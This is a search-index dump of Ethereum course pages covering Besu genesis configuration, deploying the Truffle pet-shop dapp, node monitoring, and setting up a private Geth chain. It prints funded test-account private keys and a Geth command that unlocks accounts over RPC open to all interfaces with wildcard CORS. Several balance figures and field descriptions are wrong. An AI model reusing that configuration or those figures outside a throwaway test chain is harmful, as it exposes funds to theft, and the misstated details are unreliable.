\"parentHash\":\"0x0000000000000000000000000000000000000000000000000000000000000000\" } Once again, we will look at the fields and explain them. { \"config\":{ \"chainId\":1337, \"constantinoplefixblock\": 0, \"clique\":{ \"blockperiodseconds\":15, \"epochlength\":30000 } } The config key section contains the following information about the blockchain \u201cchainId\u201d: 1337 In this case. 1337 refers to a local chainID. MetaMask, a self-custodial wallet, and Ganache, which is Truffle\u2019s Private Blockchain App, both use this as the local chain ID, and so to follow convention, in this genesis file we are doing the same. For a list of the network and chain IDs, please see the Documentation. \"muirglacierblock\": 0, Once again, we have set the milestone block to Muir Glacier. Something to note - The \u201cmilestone block\u201d could be for this configuration file, which is something you may see in some tutorials. For example, if we saw constantinopleBlock\": 0, this refers to a specific network upgrade that occurred at block 7,280,000 on Ethereum mainnet. For private networks, like the one that is being created in this example, the name of the latest milestone block can be listed, and set to be the genesis block. Here you can see a continuously updated list of network upgrades and the associated blocks for Ethereum. \u201cclique\u201d: This specifies that the consensus protocol for the blockchain is Clique. The options available for specifying the consensus mechanism are available in the documentation, with an overview of the proof-of-authority (PoA) consensus protocols available here. Within the specification, the following two fields are provided: \"blockperiodseconds\": 15, The minimum block time, in seconds. In this case, after 15 seconds, a new block will be proposed by the network. Given this genesis file is modeled after the testnet, it is made to approximate the minimum blocktime of mainnet, which is 15 seconds. \"epochlength\": 30000, The number of blocks at which to reset all votes. The votes refer to validators voting to add or remove validators to the network. In this case, after 30,000 blocks are created, this Clique network will discard all pending votes collected from received blocks. Existing proposals remain in effect and validators re-add their vote the next time they create a block. Starting at the coinbase we now have the information available in the genesis block \"coinbase\":\"0x0000000000000000000000000000000000000000\", \"difficulty\":\"0x1\", \"extraData\":\"0x00000000000000000000000000000000000000000000000000000000000000004592c8e45706cc08b8f44b11e43cba0cfc5892cb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\", \"gasLimit\":\"0xa00000\", \"mixHash\":\"0x0000000000000000000000000000000000000000000000000000000000000000\", \"nonce\":\"0x0\", \"timestamp\":\"0x5c51a607\", \"alloc\": { \"fe3b557e8fb62b89f4916b721be55ceb828dbd73\": { \"privateKey\": \"8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"0xad78ebc5ac6200000\" }, \"627306090abaB3A6e1400e9345bC60c78a8BEf57\": { \"privateKey\": \"c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" }, \"f17f52151EbEF6C7334FAD080c5704D77216b732\": { \"privateKey\": \"ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" } } \"coinbase\": \"0x0000000000000000000000000000000000000000\", The coinbase account, which is where all block rewards for this network will be paid. In this case it is to 0x0000000000000000000000000000000000000000, which is sometimes called address(0) or the zero address. \"difficulty\": \"0x1\", The difficulty of creating a new block. Represented as a hexadecimal string, the difficulty is set to 1, effectively the lowest difficulty. \"extraData\":\"0x00000000000000000000000000000000000000000000000000000000000000004592c8e45706cc08b8f44b11e43cba0cfc5892cb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\", Extra data is a recursive length prefix (RLP) encoded string (which is space efficient) containing the validator address of the Clique private network, which in this case is 4592c8e45706cc08b8f44b11e43cba0cfc5892cb. Instructions on how to create an RLP using Besu can be found here and how to add additional addresses for a Clique network with additional signers can be found here. \"gasLimit\": \"0xa00000\", The block gas limit, which is the total gas limit for all transactions included in a block. It defines how large the block size can be for the block, and is represented by an hexadecimal string. For this network, the gas limit is \"mixHash\":\"0x0000000000000000000000000000000000000000000000000000000000000000\", The mixHash is the unique identifier for the block, which for this genesis file is 0x0000000000000000000000000000000000000000000000000000000000000000 \"nonce\": \"0x0\", \"timestamp\": \"0x5c51a607\", In this case 0x5c51a607 is a hexadecimal which converts to 1548854791 and represents Wed Jan 30 2019 13:26:31 GMT+0000. \"alloc\": { \"fe3b557e8fb62b89f4916b721be55ceb828dbd73\": { \"privateKey\": \"8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"0xad78ebc5ac6200000\" }, \"627306090abaB3A6e1400e9345bC60c78a8BEf57\": { \"privateKey\": \"c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" }, \"f17f52151EbEF6C7334FAD080c5704D77216b732\": { \"privateKey\": \"ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" } The alloc field creates three addresses on our network, The balance can be passed in as a decimal (like the second and third account, which are both 900 ETH, or 2 10^20 Wei) OR a hexadecimal (like the first account, which is 200 ETH, or 2 10^20 Wei). The balance is always in Wei, or 10^-18 Ether. Deploying Your Genesis File Once you have created your genesis file, you will save it within the directory where your blockchain networks files will be kept. Do not save it within any of the Node or data folders, but rather at the top level. When it is time to start your network, you will use the flag --genesis-file=../genesis.json To start up your network using the genesis file use the following command: besu --genesis-file=../genesis.json For more information, please see the Documentation. Part 4: Deploy the Pet Shop Decentralized Application within the dapps folder of the quorum-test-network directory We are now going to deploy a decentralized application (dapp) to our private network. From your terminal, change directory to the folder dapps, and then into pet-shop cd dapps/pet-shop/ Within this directory, you will find a file called custom_config and a script called run_dapp.sh run_dapp.sh looks like the following:","title":"Part 3: Set up MetaMask"},{"location":"S02-ethereum/M4-clients-workshop/L1/#binbash","text":"set -e hash truffle 2>/dev/null || { echo >&2 \"This script requires truffle but it's not installed.\" echo >&2 \"Refer to documentation to fulfill requirements.\" exit 1 } rm -rf pet-shop-box git clone https://github.com/truffle-box/pet-shop-box.git cp -r custom_config/* ./pet-shop-box/ cd pet-shop-box/ npm install npm install truffle npm install @truffle/hdwallet-provider truffle compile truffle migrate --network quickstartWallet truffle test --network quickstartWallet docker build . -t quorum-dev-quickstart_pet_shop docker run -p 3001:3001 --name quorum-dev-quickstart_pet_shop --detach quorum-dev-quickstart_pet_shop This script is going to download from GitHub a Truffle box, which are pre-built dapps or templates for building your own dapp. In this case, the pet-shop dapp contains a smart contract called Adoption.sol, a front-end for this dapp written in react, which is a javascript library specifically for building front-ends and user interfaces, and the necessary dependencies needed to deploy the smart contract to an Ethereum network. The script is going to install truffle which is required in order to run commands using truffle, like truffle migrate. Truffle migrate is a command which specifically compiles our smart contract (Adoption.sol) into EVM bytecode and deploys it to the private network we have created. The script also downloads hdwallet-provider, which is used to create Ethereum accounts that we can use to interact with our decentralized application, and to send transactions on the private network we have created. The Ethereum accounts we have created will be imported into MetaMask. If you want to familiarize yourself with Truffle, you can walk through a tutorial here. For our current tutorial, we are using the private network created by the quorum quickstart as our local test blockchain network. Within the folder custom_config, we have our Smart Contract - Adoption.sol Adoption.sol is a simple smart contract written in solidity. It looks like this: pragma solidity ^0.5.0; contract Adoption { address[16] public adopters; // Adopting a pet function adopt(uint petId) public returns (uint) { require(petId >= 0 && petId <= 15); adopters[petId] = msg.sender; return petId; } // Retrieving the adopters function getAdopters() public view returns (address[16] memory) { return adopters; } } A detailed description of this smart contract, along with a tutorial to build it can be found on the Truffle website. We are going to give you a quick overview of the contract in order to contextualize what happens once it is deployed to our private blockchain. Let us take a look at the smart contract to better understand what it does: pragma solidity ^0.5.0; This first line of code tells us the smart contract is written for Solidity version 0.5.0 or higher, and will be compatible with 0.5.0 and higher. contract Adoption { address[16] public adopters; These two lines of code do the following: contract Adoption { declares an object of type contract. If you want to learn more about this object type, the Solidity documentation has a nice explanation of a Contract object. In this example, anything after the { (the brackets) will define the contract object - what it can do and what it can store on the blockchain. address[16] public adopters; instantiates 16 addresses in an array which we have given the variable name \u201cadopters\u201d. These addresses are public, which means they can be accessed from outside of this contract as well as inside the contract. // Adopting a pet function adopt(uint petId) public returns (uint) { require(petId >= 0 && petId <= 15); adopters[petId] = msg.sender; return petId; } The first line is a comment, which will not be compiled but gives us information that the following function is for adopting a pet. The function, adopt, takes in a unsigned integer called petID, and checks if it is between 0 and 15. If it is, then the address at the location of the the petID within the adopters array is assigned to the account that called the adopt function (adopters[petID] = msg.sender is the specific code). Then the petID is returned. The second function: // Retrieving the adopters function getAdopters() public view returns (address[16] memory) { return adopters; } returns the array of addresses of the adopters. Now that we understand the smart contract,we run the command ./run_dapp.sh in the terminal within the pet-shop folder (which we should have already navigated into if you have been following along with each step). This is going to download all the dependencies, as well as compile and migrate our smart contract to the private network we have created using the Quorum quickstart, and spin up a front end that will allow us to \u201cadopt\u201d some group of 16 pets. When you run it, there will be many downloads. You know that the script has successfully run when you reach the following: Here we can see that Truffle has deployed the Migrationsmart contract and has now deployed it to the Hyperledger Besu based blockchain network we have spun up. If we take the contract address: 0x345cA3e014Aaf5dcA488057592ee47305D9B3e10 that is listed here and navigate in a web browser to the block explorer (go to your browser and type in: http://localhost:25000/, then paste in the contract address: 0x345cA3e014Aaf5dcA488057592ee47305D9B3e10 We will see the following information about our deployed smart contract: We can also use the block explorer to look up other information, like the externally owned account (in the >account field, which for our specific example is: 0x627306090abaB3A6e1400e9345bC60c78a8BEf57) We are able to see the ETH balance for that account. The ETH used in this example is not mainnet ETH, and it is only used for testing purposes. From this step, we hope that you can see how you can use the quickstart to deploy a decentralized application. Thus, the quickstart provides you with a template of being able to test a decentralized application of your own that you build. Let\u2019s look at the dapp by going to our browser and typing in http://localhost:3001. We will arrive at the following screen, and MetaMask, which we installed in Part 3, will pop up for us and ask which account we want to connect to the application. Hitting adopt will prompt MetaMask to pop-up and adopt the pet: Since this is a gasless network, there is no fee associated with adopting a pet. Issues you may encounter and how to solve them When you run /.run_dapp.sh you may get the following error: The Error: Deployment Failed \u201cMigrations\u201d --Wrong chainId means that within the deployment.js file, the chainID (which chain you are deploying to) was incorrectly specified. If that is the case, you should run the npx quorum-dev-quickstart again, as this means you are on an older version of the quickstart that does not have the most up to date versions of truffle and hd-wallet provider. Specifically, you need to be on 1.4.0 and above of hd-wallet provider. Versions 1.3.0 and 1.3.1 will not work work with the quickstart (though users will see that version 1.2.6 will still work with the quickstart). Make sure you are on version 0.0.21 of the quickstart or higher to avoid this issue. If there is no UI that appears at localhost:3001 after running the script ./run_dapp.sh, navigate to the pet-shop-box folder: cd pet-shop-box amd use the command npm run dev to start up the front end in our browser. If this runs successfully, we will get the following output in the terminal: Then you can navigate to the URLs listed in the output to see your application. Part 5: Use the monitoring tools used in the quickstart There are monitoring tools included in the quickstart, which allow us to learn about how our private blockchain network is working. In part 4, we use the block explorer to look at the contract address of the deployed smart contract and the externally owned account that was responsible for deploying the smart contract to our network. Now we are going to explore two additional tools we can use to monitor our private network. The first is Prometheus - an open source monitoring tool that pulls data from the services that it is connected to - like nodes, databases, validators, servers, etc - and allows for that data from these services to be use in alerts and notifications. For example, if the memory usage of a certain node on your network exceeds a defined threshold, Prometheus is able to track this and alert you so you can take the appropriate action to ensure your network continues to run properly. In the case of a failure, Prometheus provides the data from the various services to allow for troubleshooting the issue. Prometheus pulls the data and stores it in a database, and then allows you or a data visualization tool to query that data. When you install and run the quickstart, you will get access to Prometheus at http://localhost:9090/graph. If you enter this address into a web browser, you will see the following: What exactly is Prometheus monitoring? To see the details, you can navigate to the config folder within your quorum-test-network directory. Opening the prometheus folder will reveal a prometheus.yml file. If you open that with a text editor (like Visual Studio Code or Vim) you will see that Prometheus is configured by the quickstart to scrape data from each validator, the rpcnode, and each member of the network every 15 seconds, and to store that data in the /metrics pathway, so that you can query it. Below is a screenshot of the first 28 of the total 129 lines of the prometheus.yml file The metrics we have access to can be seen by navigating and clicking on the curricular icon next to the Execute button in the right upper side of the screen. This will reveal the list of metrics that you can query Promtheus to return data for: If we choose ethereum_peer_count, it will return the number of peers on the network, which for this example is seven If we type in the following query into the search bar (the part of the user interface with \u201cExpression (press Shift+Enter for newlines) besu_blockchain_difficulty_total We will get back the following a result of our query that will look similar to the the below screenshot: This query is asking Prometheus to return data on the total difficulty for each participant node in our network. Prometheus has an integration with Granfana - an observability platform that takes in data - in this case from our private blockchain via Prometheus - and displays the outputs as visualizations. This allows us to make sense of what is occurring in our private network over time. The quickstart manages the connection of the data from Prometheus to pre-built dashboards in Grafana. If you navigate to http://localhost:3000/d/XE4V0WGZz/besu-overview?orgId=1&refresh=10s&from=now-30m&to=now&var-system=All, the metrics from Prometheus will be displayed in a Grafana dashboard, providing us with the metrics in tabular and graphical format. This format makes exploring the data retrieved from Prometheus easier, and allows us to explore many metrics simultaneously. Logs are available via Elasticsearch, Logstash, and Kibana (ELK). ELK allows us to take in process, search, transform, and display data. In the Quickstart, this is configured specifically to ingest the Besu logs. As a reminder, navigating to the terminal and running the script ./list.sh This script will show the various endpoints and services available in the quickstart Quorum Dev Quickstart","title":"!/bin/bash"},{"location":"S02-ethereum/M4-clients-workshop/L1/#setting-up-the-index-patterns-in-kibana","text":"","title":"Setting up the index patterns in kibana ..."},{"location":"S02-ethereum/M4-clients-workshop/L1/#list-endpoints-and-services","text":"JSON-RPC HTTP service endpoint : http://localhost:8545 JSON-RPC WebSocket service endpoint : ws://localhost:8546 Web block explorer address : http://localhost:25000/ Prometheus address : http://localhost:9090/graph Grafana address : http://localhost:3000/d/XE4V0WGZz/besu-overview?orgId=1&refresh=10s&from=now-30m&to=now&var-system=All Collated logs using Kibana endpoint : http://localhost:5601/app/kibana#/discover For more information on the endpoints and services, refer to README.md in the installation directory. Navigating to the Collated logs using Kibana endpoint using your browser http://localhost:5601/app/kibana#/discover This will pull up a Kibana dashboard The logs are pulled automatically by the setup of the Quickstart. For more information about configuring Kibana on your own, you can see an overview within the documentation. Part 6: Deploy a second Smart Contract to the network and send a private transaction Now we are going to take another smart contract and deploy it to our network. This will be a simple smart contract, and the goal of deploying it is to demonstrate the use of private transactions in the network.. This smart contract is already installed as part of the quickstart, and you can find it in the folder smart_contracts. Navigate to the smart_contracts folder using the command cd smart_contracts and you can look at that smart contract EventEmitter.sol: pragma solidity ^0.7.0; // compile with: // solc EventEmitter.sol --bin --abi --optimize --overwrite -o . // then create web3j wrappers with: // web3j solidity generate -b ./generated/EventEmitter.bin -a ./generated/EventEmitter.abi -o ../../../../../ -p org.hyperledger.besu.tests.web3j.generated contract EventEmitter { address owner; event stored(address _to, uint _amount); address _sender; uint _value; constructor () public { owner = msg . sender ; } function store ( uint _amount ) public { emit stored ( msg . sender , _amount ); _value = _amount ; _sender = msg . sender ; } function value () view public returns ( uint ) { return _value ; } function sender () view public returns ( address ) { return _sender ; } } Run the commands npm install node scripts/deploy.js which will deploy the EventEmitter.sol smart contract that is in the contracts folder and send a private transaction from Member1 to Member3 of the network. The private transaction, in this example, is the sending of a value from Member1 to Member3. If we look inside the deploy.js script, we will see that the value being sent from Member1 to Member3 is 47 (see line 89 within the deploy.js file) Alt Text: Private Transaction example output Looking at this output in the terminal, the following has occurred. The smart contract EventEmitter.sol was migrated and deployed to our network. This is confirmed by the following outputs: Getting contractAddress from txHash: 0x022cc35254299433dbda514a979ed7a9a93a45ead383efec4ad5a84e8a817f3e Waiting for transaction to be mined ... Private Transaction Receipt: [object Object] Contract deployed at address: 0xdb6172b4ed41f7039cac4d0be4dbb9992c755809 Once the EventEmitter.sol contract was deployed, Member1 sent a private transaction to Member3. Member1 and Member3 can see the value within the transaction, which has been hashed, as Member1 value from deployed contract is: 0x000000000000000000000000000000000000000000000000000000000000002f Member3 value from deployed contract is: 0x000000000000000000000000000000000000000000000000000000000000002f Member2, which was not included in the private transaction, is unable to see that value, and gets a returned value of 0x. Member2 value from deployed contract is: 0x What has been demonstrated here is that two Members can send transactions between each other, and other members cannot observe the contents of the transaction. For more information, please see the Documentation. Congratulations! You have successfully run through many of the features of Hyperledger Besu. Other Ways to Start Hyperledger Besu Hyperledger Besu starts and is controlled through the command line interface (CLI) of your computer, as seen in this tutorial. If we did not use the quickstart, we would download Hyperledger Besu and run it via the command line. For example, when a Hyperledger Besu node is started up to connect to mainnet, this is done by running the command: besu In the command line. This command is actually calling a bunch of default options and subcommands that tell the client software how to set up the node. When we call the above command, behind the scenes we are actually calling: besu --network=mainnet --datapath=besu --api-gas-price-blocks=100 --api-gas-price-max=500000000000 --api-gas-price-percentile=50.0 --bootnodes=enode://c35c3...d615f@1.2.3.4:30303,enode://f42c13...fc456@1.2.3.5:30303 --config-file=none --discovery-enabled=true --miner-coinbase= --min-gas-price=1000 This is quite a bit longer than running the besu command! What we are trying to illustrate is the fact that besu is very customizable, but we have to use specific syntax (options and subcommands) in the command line in order to customize the node(s) and network created upon starting up Besu. The above is an example of the options and subcommands that apply to creating a full node running proof of work (PoW) consensus for mainnet Ethereum. However, these options and subcommands can also be used to create private and consortium networks. The Hyperledger Besu documentation has all the options and subcommands that you can apply when using Hyperledger Besu. In this article, we are going to explain options and subcommands, and introduce what certain combinations of options and subcommands allow us to do. What is an option? What is a subcommand? When using the CLI, we call commands. These commands are programs (they may also sometimes be classified as scripts) that tell the computer to do a specific set of actions. When Hyperledger Besu is installed on your computer, it creates a global command besu - which tells your computer to run the Besu client with the default options and subcommands we showed above. Let\u2019s walk through some of those in more detail. Options: --network Options are variables that work with the base command of besu. One example option is --network= When we run the besu command, the default network is mainnet, so running besu or besu --network=mainnet accomplishes the same outcome - Hyperledger Besu starts the process of connecting to mainnet. But, we can tell Hyperledger Besu to connect to different networks, including a local testnet on our computer. If we wanted Hyperledger Besu to connect to the testnet Rinkeby, we would use the option: besu --network=rinkeby If we want Besu to start locally on our computer as a private PoW network, the network option becomes besu --network=dev You are now starting to see how an option modifies the command besu. Subcommands: blocks Subcommands are programs that tell the computer to run an additional operation. An example of a subcommand is besu blocks export [--start-block= ] [--end-block= ] --to= This highlighted subcommand tells Hyperledger Besu to export a block or a range of blocks from storage to a file in an RLP format. In practice this would be called like: besu blocks export --start-block=100 --end-block=300 --to=/home/exportblock.bin We have told Hyperledger Besu to export from mainnet the blocks 100 to 300 from mainnet to the location on our computer ~/home/exportblock.bin The subcommand differs from an option because it is a subcommand telling the computer to run another program, whereas an option is telling the computer to modify the parameters of the original command. Subcommands are short lived and give the user functionality related to a specific quick task, and then exit. They do not keep the command running. A subcommand and option are different in the ways they interact with the program. As we saw earlier, an option modifies a program by providing it with certain parameters. The subcommand, on the other hand, is actually telling the program to run another operation entirely.","title":"List endpoints and services"},{"location":"S02-ethereum/M5-installing-geth/","text":"Setting up Geth Geth (Go-Ethereum) is a command line interface for running a full ethereum node implemented in Go. This is your local portal to the Ethereum network. When you are running a local Ethereum node, you do not need to rely on any 3rd party service to connect to the Ethereumblockchain. This is what makes the network \u201ctrustless\u201d. Capabilities By installing and running geth, you can take part in the Ethereum live network and Mine real ether Transfer funds between addresses Create contracts and send transactions Explore block history And much more! Interfaces Geth has several interfaces through which you can communicate with your Ethereum node. JavaScript Console: you can start geth with an interactive console, that provides a javascript runtime environment exposing a javascript API to interact with your node. The JavaScript Console API includes the web3 javascript \u00d0app API as well as an 'admin' API. JSON-RPC server: you can start geth with a json-rpc server that exposes the JSON-RPC API Command line options documents command line parameters as well as subcommands. See this page for instructions on how to install geth for your platform. Install geth and start interacting with our node. Once you install geth, open a new terminal window and type geth You will see something like the following. Geth starts to look for and connect to peers on the Ethereum network. Once geth finds a peer, it starts syncing blockchain data, importing block headers, block receipts and state entries. You can stop the process with \u201cCtrl + C\u201d. Geth also opens an ipc endpoint through which you can connect to your node. If you type: geth attach [path to the ipc endpoint] in another terminal window, the geth javascript console will appear. In my case, I typed geth attach ~/.ethereum/geth.ipc if you are on Windows, you have to access the javascript console using the pipe geth created by typing the following: geth attach ipc:\\\\.\\pipe\\geth.ipc Or when you start geth, you can type geth console and geth will start with the javascript console already displayed. Geth will continue to print logs, which can be annoying when you are typing in the console. To silence the logs, enter debug.verbosity(0) in the console. Type exit to exit the javascript console. Geth defaults to sync with the main network, but we can sync with any network that we want. Creating an Ethereum Account Before we launch our private blockchain, let's setup an Ethereum account on Geth. Run: geth account new Be sure to remember your password! You should see something like this: Your account number will look different from the image. Copy the address down somewhere, we'll need it for the next step! Repeat the step one more time to ensure you have two separate accounts. Creating a private blockchain Every blockchain starts with a genesis block, the first block. To create our own blockchain, we need to specify a genesis file from which geth can create a genesis block. Create a new file called genesis.json and paste in the following: { \"config\" : { \"chainId\" : 4568 , \"homesteadBlock\" : 0 , \"eip150Block\" : 0 , \"eip155Block\" : 0 , \"eip158Block\" : 0 }, \"alloc\" : {}, \"difficulty\" : \"0x100\" , \"extraData\" : \"\" , \"gasLimit\" : \"0x7A1200\" , \"parentHash\" : \"0x0000000000000000000000000000000000000000000000000000000000000000\" , \"timestamp\" : \"0x00\" } So what's in this genesis file? The config section defines the settings for the private blockchain. The chainId identifies the blockchain. The Ethereum main net has a chainId of 1. The Ropsten testnet has a chainId of 3, Rinkeby is 4 and Kovan is 42. This genesis file has a chainId of 4568, hopefully nobody else is running a chain with the same chainId. We can use the same client to connect to all of the different Ethereum networks. The Ethereum protocol has hard forked and introduced several backward-incompatible protocol changes. homesteadBlock and eip155/8Block tell geth in which blocks the changes start. We set these to zero. alloc allows us to create addresses and fill the accounts with ether upon initializing the blockchain. We will leave this empty and mine ether to fill our accounts. Difficulty indicates how difficult it will be to discover a valid hash of the block. It defines the mining target, which the clients calculate from the previous block's difficulty level and the timestamp. The higher the difficulty, the more calculations the miner will have to do to find a block (on average). This value fluctuates to maintain a target block generation time (~15 seconds in Ethereum). We keep this value low on our private chain so we can quickly find blocks so we don't have to wait. extraData is an optional 32 byte value where we can add anything. gasLimit is a value that sets the chain-wide limit of gas expenditure per block. We set the value to 10,000,000 as that is the current limit on the main net. parentHash is the keccak256 hash of the parent block's header. This pointer to the parent block builds the chain of blocks. timestamp is the output of Unix time() function at the block's creation. This parameter helps determine if the difficulty level should be changed to maintain a consistent average block time. It also allows us to verify the order of the blocks in the chain. Then we need to initialize the geth node with the custom genesis file. In your private blockchain directory, run: geth --datadir . init genesis.json The last line of output in the console should say Successfully wrote genesis state . Now we can start the private network so we can mine blocks on the private chain. If you're on a Mac, run: geth --allow-insecure-unlock --datadir . --keystore ~/Library/ethereum/keystore --networkid 4568 --http --http.addr '0.0.0.0' --http.corsdomain \"*\" --http.port 8502 --http.api 'personal,eth,net,web3,txpool,miner' --mine --miner.etherbase=YOUR_ETHEREUM_ADDRESS_HERE If you're on Linux, run: geth --allow-insecure-unlock --datadir . --keystore ~/.ethereum/keystore --networkid 4568 --http --http.addr '0.0.0.0' --http.corsdomain \"*\" --http.port 8502 --http.api 'personal,eth,net,web3,txpool,miner' --mine --miner.etherbase=YOUR_ETHEREUM_ADDRESS_HERE Put the Ethereum address generated earlier instead of YOUR_ETHEREUM_ADDRESS_HERE . You should see something like: In a new terminal window, cd to the private directory and run: geth attach geth.ipc You should see something like this: In the console, type web3 . This will print all of the commands available via the console. If you navigate to the test-private-blockchain data directory, you will see two directories, geth and keystore . Geth is where the blockchain data will be stored and keystore will hold account information. Notice that the keystore directory is empty. Check your account You can access all of your geth accounts with eth.accounts and it will print them in an array. > eth.accounts [\"0x1c29b7832ad2e4731d816e60f767777cbf374e15\", \"0x01058d7d56a216b3f1ff8f41c20ad58888424de7\"] You can check the balance of an account with the eth.getBalance() method and entering the account. > eth.getBalance(eth.accounts[0]) 0 Mining the private chain Since the private blockchain is maintaining consensus using proof of work, we need to mine new blocks to process transactions. To start mining, just run miner.start() . Geth needs to build a DAG before the miner starts, but once it does that it will start mining blocks on the private chain. After a few blocks are mined, stop it with miner.stop() . See this link for more information about what is going on when geth is creating a DAG. Check the ether balance of you first account now. It should contain some ether. The first geth account will default to the coinbase, or etherbase account, which is the account to which mining rewards are sent. You can check this with eth.coinbase . Sending a transaction Now that we have some ether in our account, we can send some to another account. For this we can use the geth console and input the eth.sendTransaction() method that takes a transaction object. An ethereum transaction includes the following data: from: String - The address for the sending account. Uses the web3.eth.defaultAccount property, if not specified. to: String - (optional) The destination address of the message, left undefined for a contract-creation transaction. value: Number|String|BigNumber - (optional) The value transferred for the transaction in Wei, also the endowment if it's a contract-creation transaction. gas: Number|String|BigNumber - (optional, default: To-Be-Determined) The amount of gas to use for the transaction (unused gas is refunded). gasPrice: Number|String|BigNumber - (optional, default: To-Be-Determined) The price of gas for this transaction in wei, defaults to the mean network gas price. data: String - (optional) Either a byte string containing the associated data of the message, or in the case of a contract-creation transaction, the initialisation code. nonce: Number - (optional) Integer of a nonce. This allows to overwrite your own pending transactions that use the same nonce. To send some ether to another account, first create another account. > personal.newAccount() Next initiate the transaction by specifying the to, the from and the value. > eth.sendTransaction({to: eth.accounts[1], from: eth.accounts[0], value: 100}) But this throws an error! Error: authentication needed: password or unlock . Geth requires that you unlock your account to send transactions from the account. > personal.unlockAccount(eth.accounts[0]) Unlock account 0xabc... true Now you can send a transaction from account 0. > eth.sendTransaction({to: eth.accounts[1], from: eth.accounts[0], value: 100}) INFO [09-10|17:54:38.360] Setting new local account address=0x1c29B7832aD2E4731D816E60f767777CbF374E15 INFO [09-10|17:54:38.361] Submitted transaction fullhash=0xdec2391ee28a7997567e5176de995340cf09fd64dc823414f6bf763b1fd1e6ed recipient=0x01058d7d56a216B3F1FF8f41c20ad58888424dE7 \"0xdec2391ee28a7997567e5176de995340cf09fd64dc823414f6bf763b1fd1e6ed\" Check the balance of account 1. > eth.getBalance(eth.accounts[1]) 0 It's still zero, because we are not running the miner. Start mining to process the transaction. You can stop mining after geth creates a block. Check the balance of account 1 again. > eth.getBalance(eth.accounts[1]) 100 It should say 100! You have successfully sent a transaction from one account to another over your single node Ethereum network! Additional Materials Running Geth in dev Mode - an optimized way to run a single node for developing locally","title":"Index"},{"location":"S02-ethereum/M5-installing-geth/#setting-up-geth","text":"Geth (Go-Ethereum) is a command line interface for running a full ethereum node implemented in Go. This is your local portal to the Ethereum network. When you are running a local Ethereum node, you do not need to rely on any 3rd party service to connect to the Ethereumblockchain. This is what makes the network \u201ctrustless\u201d.","title":"Setting up Geth"},{"location":"S02-ethereum/M5-installing-geth/#capabilities","text":"By installing and running geth, you can take part in the Ethereum live network and Mine real ether Transfer funds between addresses Create contracts and send transactions Explore block history And much more!","title":"Capabilities"},{"location":"S02-ethereum/M5-installing-geth/#interfaces","text":"Geth has several interfaces through which you can communicate with your Ethereum node. JavaScript Console: you can start geth with an interactive console, that provides a javascript runtime environment exposing a javascript API to interact with your node. The JavaScript Console API includes the web3 javascript \u00d0app API as well as an 'admin' API. JSON-RPC server: you can start geth with a json-rpc server that exposes the JSON-RPC API Command line options documents command line parameters as well as subcommands. See this page for instructions on how to install geth for your platform. Install geth and start interacting with our node. Once you install geth, open a new terminal window and type geth You will see something like the following. Geth starts to look for and connect to peers on the Ethereum network. Once geth finds a peer, it starts syncing blockchain data, importing block headers, block receipts and state entries. You can stop the process with \u201cCtrl + C\u201d. Geth also opens an ipc endpoint through which you can connect to your node. If you type: geth attach [path to the ipc endpoint] in another terminal window, the geth javascript console will appear. In my case, I typed geth attach ~/.ethereum/geth.ipc if you are on Windows, you have to access the javascript console using the pipe geth created by typing the following: geth attach ipc:\\\\.\\pipe\\geth.ipc Or when you start geth, you can type geth console and geth will start with the javascript console already displayed. Geth will continue to print logs, which can be annoying when you are typing in the console. To silence the logs, enter debug.verbosity(0) in the console. Type exit to exit the javascript console. Geth defaults to sync with the main network, but we can sync with any network that we want.","title":"Interfaces"},{"location":"S02-ethereum/M5-installing-geth/#creating-an-ethereum-account","text":"Before we launch our private blockchain, let's setup an Ethereum account on Geth. Run: geth account new Be sure to remember your password! You should see something like this: Your account number will look different from the image. Copy the address down somewhere, we'll need it for the next step! Repeat the step one more time to ensure you have two separate accounts.","title":"Creating an Ethereum Account"},{"location":"S02-ethereum/M5-installing-geth/#creating-a-private-blockchain","text":"Every blockchain starts with a genesis block, the first block. To create our own blockchain, we need to specify a genesis file from which geth can create a genesis block. Create a new file called genesis.json and paste in the following: { \"config\" : { \"chainId\" : 4568 , \"homesteadBlock\" : 0 , \"eip150Block\" : 0 , \"eip155Block\" : 0 , \"eip158Block\" : 0 }, \"alloc\" : {}, \"difficulty\" : \"0x100\" , \"extraData\" : \"\" , \"gasLimit\" : \"0x7A1200\" , \"parentHash\" : \"0x0000000000000000000000000000000000000000000000000000000000000000\" , \"timestamp\" : \"0x00\" } So what's in this genesis file? The config section defines the settings for the private blockchain. The chainId identifies the blockchain. The Ethereum main net has a chainId of 1. The Ropsten testnet has a chainId of 3, Rinkeby is 4 and Kovan is 42. This genesis file has a chainId of 4568, hopefully nobody else is running a chain with the same chainId. We can use the same client to connect to all of the different Ethereum networks. The Ethereum protocol has hard forked and introduced several backward-incompatible protocol changes. homesteadBlock and eip155/8Block tell geth in which blocks the changes start. We set these to zero. alloc allows us to create addresses and fill the accounts with ether upon initializing the blockchain. We will leave this empty and mine ether to fill our accounts. Difficulty indicates how difficult it will be to discover a valid hash of the block. It defines the mining target, which the clients calculate from the previous block's difficulty level and the timestamp. The higher the difficulty, the more calculations the miner will have to do to find a block (on average). This value fluctuates to maintain a target block generation time (~15 seconds in Ethereum). We keep this value low on our private chain so we can quickly find blocks so we don't have to wait. extraData is an optional 32 byte value where we can add anything. gasLimit is a value that sets the chain-wide limit of gas expenditure per block. We set the value to 10,000,000 as that is the current limit on the main net. parentHash is the keccak256 hash of the parent block's header. This pointer 